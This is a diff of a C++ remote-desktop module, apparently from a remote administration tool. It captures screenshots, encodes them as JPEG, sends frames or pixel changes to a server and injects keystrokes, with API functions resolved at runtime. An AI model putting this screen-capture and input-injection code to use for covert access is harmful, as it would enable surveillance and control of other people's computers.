@@ -16,13 +16,13 @@ int mod_RemoteDesktop::GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
     UINT  size = 0;         // size of the image encoder array in bytes
 
     ImageCodecInfo* pImageCodecInfo = NULL;
-    this->GDIPLUS.pGetImageEncodersSize(&num, &size);
+    this->GDIPLUS.pGdipGetImageEncodersSize(&num, &size);
     if (size == 0) { return -1; } 
 
     pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
     if (pImageCodecInfo == NULL) { return -1; }
 
-	this->GDIPLUS.pGetImageEncoders(num, size, pImageCodecInfo);
+	this->GDIPLUS.pGdipGetImageEncoders(num, size, pImageCodecInfo);
     
     for (UINT j = 0; j < num; ++j)
     {
@@ -140,9 +140,13 @@ void mod_RemoteDesktop::m_RemoteTeclado(char key, bool isDown) {
     this->USER32.pSendInput(1, inputs, sizeof(INPUT));
 }
 
-int mod_RemoteDesktop::BitmapDiff(GpImage*& _oldBitmap, GpImage*& _newBitmap, std::vector<Pixel_Data>& _outPixels) {
+//Obtiene los pixeles diferentes y los sobreescribe en _oldBitmap
+int mod_RemoteDesktop::BitmapDiff(GpBitmap*& _oldBitmap, GpBitmap*& _newBitmap, std::vector<Pixel_Data>& _outPixels) {
     if (_newBitmap == nullptr || _oldBitmap == nullptr) {
         __DBG_("Uno de los bitmaps es nulo");
+        if (_oldBitmap == nullptr) {
+            __DBG_("Bitmap viejo es nulo (probabilidad de ser primera captura");
+        }
         return -1;
     }
 
@@ -155,8 +159,8 @@ int mod_RemoteDesktop::BitmapDiff(GpImage*& _oldBitmap, GpImage*& _newBitmap, st
     UINT width = 0; 
     UINT height = 0;
 
-    if(this->GDIPLUS.pGdipGetImageHeight(_oldBitmap, &height) != GpStatus::Ok ||
-       this->GDIPLUS.pGdipGetImageWidth(_oldBitmap, &width) != GpStatus::Ok) {
+    if(this->GDIPLUS.pGdipGetImageHeight((GpImage*)_oldBitmap, &height) != GpStatus::Ok ||
+       this->GDIPLUS.pGdipGetImageWidth((GpImage*)_oldBitmap, &width) != GpStatus::Ok) {
         __DBG_("Error al obtener dimensiones de _oldbitmap");
         return -1;
 	}
@@ -164,8 +168,8 @@ int mod_RemoteDesktop::BitmapDiff(GpImage*& _oldBitmap, GpImage*& _newBitmap, st
     UINT n_width = 0;
     UINT n_height = 0;
 
-    if (this->GDIPLUS.pGdipGetImageHeight(_newBitmap, &n_height) != GpStatus::Ok ||
-        this->GDIPLUS.pGdipGetImageWidth(_newBitmap, &n_width) != GpStatus::Ok) {
+    if (this->GDIPLUS.pGdipGetImageHeight((GpImage*)_newBitmap, &n_height) != GpStatus::Ok ||
+        this->GDIPLUS.pGdipGetImageWidth((GpImage*)_newBitmap, &n_width) != GpStatus::Ok) {
         __DBG_("Error al obtener dimensiones de _newBitmap");
         return -1;
     }
@@ -178,8 +182,8 @@ int mod_RemoteDesktop::BitmapDiff(GpImage*& _oldBitmap, GpImage*& _newBitmap, st
     BitmapData bmpData1, bmpData2;
     GDIPCONST GpRect rect(0, 0, width, height);
 
-    this->GDIPLUS.pGdipBitmapLockBits((GpBitmap*)_oldBitmap, &rect, ImageLockMode::ImageLockModeRead | ImageLockMode::ImageLockModeWrite, PixelFormat24bppRGB, &bmpData1);
-    this->GDIPLUS.pGdipBitmapLockBits((GpBitmap*)_newBitmap, &rect, ImageLockMode::ImageLockModeRead | ImageLockMode::ImageLockModeWrite, PixelFormat24bppRGB, &bmpData2);
+    this->GDIPLUS.pGdipBitmapLockBits(_oldBitmap, &rect, ImageLockMode::ImageLockModeRead | ImageLockMode::ImageLockModeWrite, PixelFormat24bppRGB, &bmpData1);
+    this->GDIPLUS.pGdipBitmapLockBits(_newBitmap, &rect, ImageLockMode::ImageLockModeRead | ImageLockMode::ImageLockModeWrite, PixelFormat24bppRGB, &bmpData2);
 
     BYTE* oldBitmapPixels = static_cast<BYTE*>(bmpData1.Scan0);
     BYTE* newBitmapPixels = static_cast<BYTE*>(bmpData2.Scan0);
@@ -203,6 +207,7 @@ int mod_RemoteDesktop::BitmapDiff(GpImage*& _oldBitmap, GpImage*& _newBitmap, st
                 nPixel.data.B = newBitmapPixels[index + 2];
                 _outPixels.push_back(nPixel);
 
+                //Sobreescribir pixeles en bitmap anterior
                 oldBitmapPixels[index    ] = newBitmapPixels[index    ];
                 oldBitmapPixels[index + 1] = newBitmapPixels[index + 1];
                 oldBitmapPixels[index + 2] = newBitmapPixels[index + 2];
@@ -211,8 +216,8 @@ int mod_RemoteDesktop::BitmapDiff(GpImage*& _oldBitmap, GpImage*& _newBitmap, st
         }
     }
 
-    this->GDIPLUS.pGdipBitmapUnlockBits((GpBitmap*)_oldBitmap, &bmpData1);
-    this->GDIPLUS.pGdipBitmapUnlockBits((GpBitmap*)_newBitmap, &bmpData2);
+    this->GDIPLUS.pGdipBitmapUnlockBits(_oldBitmap, &bmpData1);
+    this->GDIPLUS.pGdipBitmapUnlockBits(_newBitmap, &bmpData2);
 
     return outCantidad;
 }
@@ -261,18 +266,19 @@ mod_RemoteDesktop::~mod_RemoteDesktop() {
 }
 
 //NOTA: Bitmap debe ser liberado luego de usarse
-Gdiplus::Bitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int index) {
-    Gdiplus::Bitmap* outBitmap = nullptr;
+GpBitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int monitor_index) {
+    GpBitmap* outBitmap = nullptr;
 
     if (!this->GDI32.pCreateCompatibleBitmap || !this->GDI32.pCreateCompatibleDC ||
         !this->GDI32.pSelectObject || !this->GDI32.pGetObjectA || !this->GDI32.pBitBlt || !this->OLE32.pCreateStreamOnHGlobal ||
         !this->USER32.pGetWindowRect || !this->GDIPLUS.pGdipCreateBitmapFromHBITMAP ||
+        !this->GDIPLUS.pGdipCreateBitmapFromStream ||
         !this->GDI32.pDeleteDC || !this->GDI32.pDeleteObject) {
         __DBG_("[RD][getFrameBitmap]No se cargaron todas las funciones");
         return outBitmap;
     }
 
-    Monitor monitor = this->m_GetMonitor(index);
+    Monitor monitor = this->m_GetMonitor(monitor_index);
     if (monitor.rectData.resHeight == 0) {
         __DBG_("[X] El monitor no es valido o no se ha obtenido al lista");
         return outBitmap;
@@ -294,12 +300,10 @@ Gdiplus::Bitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int index) {
     HDC hdcMonitor = this->USER32.pGetDC(NULL);
     HDC hdcMemDC = NULL;
     HWND hDesktopWnd = this->USER32.pGetDesktopWindow();
-    HBITMAP hmpScreen = NULL;
+    HBITMAP hmpScreen = NULL; //Para leer toda la pantalla seleccionada 
 
-    Gdiplus::Bitmap* pScreenShot = nullptr;
-    GpBitmap* pGpBitmap = nullptr;
-    GpBitmap* pGpBitmap2 = nullptr;
-    GpImage* pGpImage = nullptr;
+    GpBitmap* bmpBitmap = nullptr;
+    GpBitmap* jpgBitmap = nullptr;
     IStream* oStream = nullptr;
     HRESULT hr = S_OK;
     
@@ -334,16 +338,19 @@ Gdiplus::Bitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int index) {
         __DBG_("Createcompatiblebitmap failed\n");
         goto EndSec;
     }
+    
     if (!this->GDI32.pSelectObject(hdcMemDC, hmpScreen)) {
         __DBG_("select object failed\n");
         goto EndSec;
     }
+    
+    //Copiar los bits al bitmap   hmpScreen
     if (!this->GDI32.pBitBlt(hdcMemDC, 0, 0, monitor.rectData.resWidth, monitor.rectData.resHeight, hdcMonitor, monitor.rectData.xStart, monitor.rectData.yStart, SRCCOPY)) {
         __DBG_("bitblt failed\n");
         goto EndSec;
     }
 
-    //Si esta habilitado mostrar el mouse
+    //Si esta habilitado mostrar el mouse capturar posicion y dibujar el puntero en el hdc   hdcMemDC
     if (this->m_Vmouse()) {
         if (this->USER32.pGetCursorInfo != nullptr &&
             this->USER32.pGetIconInfo != nullptr &&
@@ -369,37 +376,34 @@ Gdiplus::Bitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int index) {
 
     CLSID imageCLSID;
     
-    Gdiplus::EncoderParameters encoderParams;
+    EncoderParameters encoderParams;
     encoderParams.Count = 1;
     encoderParams.Parameter[0].NumberOfValues = 1;
     encoderParams.Parameter[0].Guid = { 0x1d5be4b5,0xfa4a,0x452d,0x9c,0xdd,0x5d,0xb3,0x51,0x05,0xe7,0xeb };/*Gdiplus::EncoderQuality;*/
-    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
+    encoderParams.Parameter[0].Type = EncoderParameterValueType::EncoderParameterValueTypeLong;
     encoderParams.Parameter[0].Value = &quality;
 
     this->GetEncoderClsid(L"image/jpeg", &imageCLSID);
     
-    if (this->GDIPLUS.pGdipCreateBitmapFromHBITMAP(hmpScreen, NULL, &pGpBitmap) == Gdiplus::Status::Ok && pGpBitmap) {
-        pScreenShot = reinterpret_cast<Gdiplus::Bitmap*>(pGpBitmap);
-    } else {
-        __DBG_("GdipCreateBitmapFromHBITMAP failed");
+    //Crear el bitmap a partir del hbitmap capturado en hmpScreen
+    if (this->GDIPLUS.pGdipCreateBitmapFromHBITMAP(hmpScreen, NULL, &bmpBitmap) != GpStatus::Ok || !bmpBitmap) {
+        __DBG_("GdipCreateBitmapFromHBITMAP failed  or  bmpBitmap null");
         goto EndSec;
     }
     
-    if (!pScreenShot) {
-        __DBG_("No se pudo reservar memoria para crear el bitmap");
-        goto EndSec;
-    }
-
-    if(this->GDIPLUS.pGdipSaveImageToStream(pScreenShot, oStream, &imageCLSID, &encoderParams) != Gdiplus::Status::Ok) {
+    //Guardar el bitmap al stream  oStream  en formato jpeg
+    if(this->GDIPLUS.pGdipSaveImageToStream(bmpBitmap, oStream, &imageCLSID, &encoderParams) != GpStatus::Ok) {
 		__DBG_("No se pudo guardar el buffer al stream");
         goto EndSec;
     }
 
     oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
 
-    this->GDIPLUS.pGdipCreateBitmapFromStream(oStream, &pGpBitmap2);
-    if (pGpBitmap2 != nullptr) {
-        //outBitmap = reinterpret_cast<Gdiplus::Bitmap*>(pGpBitmap2);
+    //Crear otro bitmap, esta vez con formato jpeg
+    GpStatus iret;
+    iret = this->GDIPLUS.pGdipCreateBitmapFromStream(oStream, &jpgBitmap);
+    if (jpgBitmap != nullptr) {
+        outBitmap = jpgBitmap;
     }
 
 EndSec:
@@ -407,8 +411,8 @@ EndSec:
         oStream->Release();
     }
 
-    if (pScreenShot) {
-        this->GDIPLUS.pGdipDisposeImage(reinterpret_cast<Gdiplus::Image*>(pScreenShot));
+    if (bmpBitmap) {
+        this->GDIPLUS.pGdipDisposeImage((GpImage*)bmpBitmap);
     }
 
     if (hdcMonitor) {
@@ -426,7 +430,7 @@ EndSec:
     return outBitmap;
 }
 
-std::vector<char> mod_RemoteDesktop::getBitmapBytes(Gdiplus::Bitmap*& _in, ULONG _quality) {
+std::vector<char> mod_RemoteDesktop::getBitmapBytes(GpBitmap*& _in, ULONG _quality) {
     std::vector<char> vcOut;
 
     IStream* oStream = nullptr;
@@ -447,16 +451,18 @@ std::vector<char> mod_RemoteDesktop::getBitmapBytes(Gdiplus::Bitmap*& _in, ULONG
 
     CLSID imageCLSID;
 
-    Gdiplus::EncoderParameters encoderParams;
+    EncoderParameters encoderParams;
     encoderParams.Count = 1;
     encoderParams.Parameter[0].NumberOfValues = 1;
     encoderParams.Parameter[0].Guid = { 0x1d5be4b5,0xfa4a,0x452d,0x9c,0xdd,0x5d,0xb3,0x51,0x05,0xe7,0xeb };/*Gdiplus::EncoderQuality;*/
-    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
+    encoderParams.Parameter[0].Type = EncoderParameterValueType::EncoderParameterValueTypeLong;
     encoderParams.Parameter[0].Value = &_quality;
 
+    //Guardar imagen al stream oStream en formato jpeg
     this->GetEncoderClsid(L"image/jpeg", &imageCLSID);
 	this->GDIPLUS.pGdipSaveImageToStream(_in, oStream, &imageCLSID, &encoderParams);
     
+    //Leer todos lo bytes del stream
     hr = oStream->Stat(&statstg, STATFLAG_NONAME);
     if (hr == S_OK) {
         ULONG bytes_read = 0;
@@ -489,7 +495,7 @@ void mod_RemoteDesktop::pixelSerialize(const std::vector<Pixel_Data>& _vcin, std
     }
 }
 
-void mod_RemoteDesktop::SpawnThread(int quality, int monitor_index) {
+void mod_RemoteDesktop::SpawnThread(ULONG quality, int monitor_index) {
     this->th_RemoteDesktop = std::thread(&mod_RemoteDesktop::IniciarLive, this, quality, monitor_index);
 }
 
@@ -505,7 +511,7 @@ void mod_RemoteDesktop::DetenerLive() {
     __DBG_("[RD] Done omar :v");
 }
 
-void mod_RemoteDesktop::IniciarLive(int quality, int monitor_index) {
+void mod_RemoteDesktop::IniciarLive(ULONG quality, int monitor_index) {
     if (!this->GDIPLUS.pGdipGetImageHeight || !this->GDIPLUS.pGdipGetImageWidth ||
         !this->GDIPLUS.pGdipGetImagePixelFormat || !this->GDIPLUS.pGdipCloneBitmapAreaI ||
         !this->GDIPLUS.pGdipCreateBitmapFromScan0 || !this->GDIPLUS.pGdipDisposeImage) {
@@ -514,7 +520,7 @@ void mod_RemoteDesktop::IniciarLive(int quality, int monitor_index) {
     }
     this->isRunning = true;
     this->m_UpdateQuality(quality);
-    Gdiplus::Bitmap* oldBitmap = nullptr;
+    GpBitmap* oldBitmap = nullptr;
     while (this->m_isRunning()) {
         //Confirmar kill switch
         if (cCliente->isKillSwitch()) {
@@ -524,43 +530,48 @@ void mod_RemoteDesktop::IniciarLive(int quality, int monitor_index) {
             break;
         }
 
-        Gdiplus::Bitmap* newBitmap = this->getFrameBitmap(this->m_Quality(), monitor_index);
+        //Obtener el bitmap del monitor con la calidad requerida
+        GpBitmap* newBitmap = this->getFrameBitmap(this->m_Quality(), monitor_index);
 
+        //Comprar pixeles para ver si hay diferencia
         std::vector<Pixel_Data> vcPixels;
         int iDiff = this->BitmapDiff(oldBitmap, newBitmap, vcPixels);
 
-        if (iDiff == -1) {
-            //Hubo un error o uno de los buffers es nulo
+        if (iDiff == -1) {     //Hubo un error o probablemente es la primera captura de pantalla
             if (newBitmap != nullptr) {
                 __DBG_("Asignando newBitmap a oldBitmap");
                 
+                //Obtener dimensiones del nuevo bitmap
                 UINT n_width = 0, n_height = 0;
                 this->GDIPLUS.pGdipGetImageHeight(newBitmap, &n_height);
                 this->GDIPLUS.pGdipGetImageWidth(newBitmap, &n_width);
                 
-                Gdiplus::Bitmap* temp_bitmap = nullptr;
+                GpBitmap* copiaBitmap = nullptr;
                 GpBitmap* pGpBitmap = nullptr;
-                if (this->GDIPLUS.pGdipCreateBitmapFromScan0(
-                    n_width, n_height, 0, PixelFormat24bppRGB, nullptr, &pGpBitmap) == Gdiplus::Status::Ok && pGpBitmap) {
-                    temp_bitmap = reinterpret_cast<Gdiplus::Bitmap*>(pGpBitmap);
+                //Crear bitmap de n_width x n_height para copiar bytes del bitmap actual
+                if (this->GDIPLUS.pGdipCreateBitmapFromScan0(n_width, n_height, 0, PixelFormat24bppRGB, nullptr, &pGpBitmap) == GpStatus::Ok && pGpBitmap) {
+                    copiaBitmap = pGpBitmap;
                 }else {
                     __DBG_("[X][IniciarLive] pGdipCreateBitmapFromScan0 error");
-                    this->GDIPLUS.pGdipDisposeImage(reinterpret_cast<Gdiplus::Image*>(newBitmap));
+                    this->GDIPLUS.pGdipDisposeImage((GpBitmap*)newBitmap);
                     break;
                 }
 
-                INT temp_format = 0; 
-                this->GDIPLUS.pGdipGetImagePixelFormat(newBitmap, &temp_format);
+                //Obtener formato de pixeles del bitmap actual  newBitmap
+                PixelFormat newPixelFormat = 0;
+                this->GDIPLUS.pGdipGetImagePixelFormat(newBitmap, &newPixelFormat);
                 
-                this->GDIPLUS.pGdipCloneBitmapAreaI(0, 0, n_width, n_height, temp_format, newBitmap, &temp_bitmap);
-                oldBitmap = temp_bitmap;
+                //Clonar bitmap a copiaBitmap y preservar la direccion de memoria en oldBitmap para futuras comparaciones
+                this->GDIPLUS.pGdipCloneBitmapAreaI(0, 0, n_width, n_height, newPixelFormat, newBitmap, &copiaBitmap);
+                oldBitmap = copiaBitmap;
                 
                 //Obtener bytes del newBitmap
-                std::vector<char> imgBuffer = this->getBitmapBytes(newBitmap, quality);
+                std::vector<char> imgBuffer = this->getBitmapBytes(newBitmap, this->m_Quality());
                 int iSent = cCliente->cChunkSend(cCliente->sckSocket, imgBuffer.data(), imgBuffer.size(), 0, true, nullptr, EnumComandos::RD_Salida);
 
-                this->GDIPLUS.pGdipDisposeImage(reinterpret_cast<Gdiplus::Image*>(pGpBitmap));
-                this->GDIPLUS.pGdipDisposeImage(reinterpret_cast<Gdiplus::Image*>(newBitmap));
+                //Liberar bitmaps
+                this->GDIPLUS.pGdipDisposeImage((GpImage*)pGpBitmap);
+                this->GDIPLUS.pGdipDisposeImage((GpImage*)newBitmap);
 
                 if (iSent == -1) {
                     __DBG_("[X][IniciarLive] error enviando el frame al servidor");
@@ -569,14 +580,15 @@ void mod_RemoteDesktop::IniciarLive(int quality, int monitor_index) {
             }else {
                 __DBG_("newBitmap es nulo");
             }
-        }else if (iDiff > 0) {
+        }else if (iDiff > 0) { 
+            //Hubo un cambio en la nueva captura, enviar diferencia
             if (newBitmap != nullptr) {
-                this->GDIPLUS.pGdipDisposeImage(reinterpret_cast<Gdiplus::Image*>(newBitmap));
+                this->GDIPLUS.pGdipDisposeImage((GpImage*)newBitmap);
             }
-            //Hubo un cambio, enviar diferencia
+            
             //oldBitmap aqui ya tiene los pixeles modificados
             //Vale la pena enviar el cambio de pixeles?
-            if ((sizeof(Pixel_Data) * iDiff) < 80000) {
+            if ((sizeof(Pixel_Data) * iDiff) < MAX_PIXELS) {
                 //Serializar el vector a un std::vector<char> y mandarlo
                 std::vector<char> vcData;
                 this->pixelSerialize(vcPixels, vcData);
@@ -585,8 +597,8 @@ void mod_RemoteDesktop::IniciarLive(int quality, int monitor_index) {
                     break;
                 }
             }else {
-                //Obtener bytes de newbitmap/oldbitmap y mandarlo completo
-                std::vector<char> imgBuffer = this->getBitmapBytes(oldBitmap, quality);
+                //La cantidad de bytes no vale la pena. Enviar el frame completo
+                std::vector<char> imgBuffer = this->getBitmapBytes(oldBitmap, this->m_Quality());
                 int iSent = cCliente->cChunkSend(cCliente->sckSocket, imgBuffer.data(), imgBuffer.size(), 0, true, nullptr, EnumComandos::RD_Salida);
                 if (iSent == -1) {
                     break;
@@ -599,9 +611,34 @@ void mod_RemoteDesktop::IniciarLive(int quality, int monitor_index) {
     }
 
     if (oldBitmap != nullptr) {
-        this->GDIPLUS.pGdipDisposeImage(reinterpret_cast<Gdiplus::Image*>(oldBitmap));;
+        this->GDIPLUS.pGdipDisposeImage((GpBitmap*)oldBitmap);
     }    
 }
+
+void mod_RemoteDesktop::EnviarCaptura(ULONG quality, int monitor_index) {
+    _DBG_("[RD] Enviando captura de pantalla. Index:", monitor_index);
+    _DBG_("[RD] Calidad:", quality);
+    
+    GpBitmap* bitmapBits = this->getFrameBitmap(quality, monitor_index);
+    if (bitmapBits != nullptr) {
+        std::vector<char> vcDeskBuffer = this->getBitmapBytes(bitmapBits, quality);
+        int iBufferSize = vcDeskBuffer.size();
+        if (iBufferSize > 0) {
+            int iRet = cCliente->cChunkSend(cCliente->sckSocket, vcDeskBuffer.data(), iBufferSize, 0, true, nullptr, EnumComandos::RD_Salida);
+            if (iRet == -1) {
+                __DBG_("[RD] No se puedo enviar la captura de pantalla");
+            }else {
+                __DBG_("[RD] Captura enviada")
+            }
+        }else {
+            __DBG_("[RD] El buffer de remote_desk es 0");
+        }
+        this->GDIPLUS.pGdipDisposeImage((GpBitmap*)bitmapBits);
+    }else {
+        __DBG_("[RD] Error obteniendo el frame");
+    }
+}
+
 
 std::vector<Monitor> mod_RemoteDesktop::m_ListaMonitores() {
     this->m_Clear_Monitores();
